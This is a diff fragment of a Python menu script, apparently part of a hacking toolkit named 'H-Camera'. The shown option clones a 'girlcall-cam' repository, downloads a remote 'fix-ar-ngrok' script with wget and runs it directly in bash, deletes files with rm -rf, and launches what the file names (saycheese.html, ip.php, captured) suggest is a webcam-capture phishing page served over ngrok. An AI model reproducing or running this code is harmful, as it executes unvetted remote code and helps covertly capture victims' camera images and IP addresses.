@@ -1233,7 +1233,7 @@ def OpEn():
   os.system('rm -rf  extract.sh  Hack.sh Web.html saved.ip.txt getid Custom.html LICENSE README.md captured copy.sh extract.sh  saycheese.html index.php fix-ar-ngrok  index2.html ip.php post.php ngrok template.php index.html jmaxopcam.sh 01010cam')
   os.system('git clone https://github.com/MrAli-s/girlcall-cam.git')
   os.system('wget https://raw.githubusercontent.com/Cesar-Hack-Gray/release-download/master/fix-ar-ngrok && bash fix-ar-ngrok')
-  os.system('cp $PREFIX/bin/ngrok ~/H-Camera/girlcall-cam')
+ # os.system('cp $PREFIX/bin/ngrok ~/H-Camera/girlcall-cam')
   os.system('mv ~/H-Camera/girlcall-cam/Custom.html ~/H-Camera/girlcall-cam/LICENSE ~/H-Camera/girlcall-cam/extrach.sh ~/H-Camera/girlcall-cam/saycheese.html ~/H-Camera/girlcall-cam/README.md ~/H-Camera/girlcall-cam/Web.html ~/H-Camera/girlcall-cam/captured ~/H-Camera/girlcall-cam/copy.sh ~/H-Camera/girlcall-cam/index.php ~/H-Camera/girlcall-cam/Hack.sh ~/H-Camera/girlcall-cam/ip.php ~/H-Camera/girlcall-cam/post.php ~/H-Camera/girlcall-cam/ngrok ~/H-Camera/girlcall-cam/template.php ~/H-Camera/girlcall-cam/index2.html ~/H-Camera/girlcall-cam/index.html ~/H-Camera/girlcall-cam/jmaxopcam.sh ~/H-Camera/')
   os.system('bash jmaxopcam.sh')
  elif enter == "6" or enter == 'Discord Web' or enter == "06":
